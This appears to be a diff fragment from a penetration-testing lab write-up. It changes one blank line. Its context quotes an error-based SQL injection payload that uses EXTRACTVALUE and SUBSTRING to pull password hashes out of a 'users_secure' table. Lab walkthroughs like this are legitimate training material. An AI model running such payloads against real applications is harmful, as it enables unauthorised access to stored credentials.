@@ -84,6 +84,7 @@ After some attemps, I found a valid query using "substring" which can extract ha
 
 Modifying this query I was able to get the other half (just replacing 1,32 by 32,60):
 ![sqli4](\assets\images\pg-practice-apex\92.JPG)
+
 Querys:
 ```
 eid=1 AND EXTRACTVALUE(0x3b,(SELECT Substring(password,1,32)FROM users_secure LIMIT 0,1)))
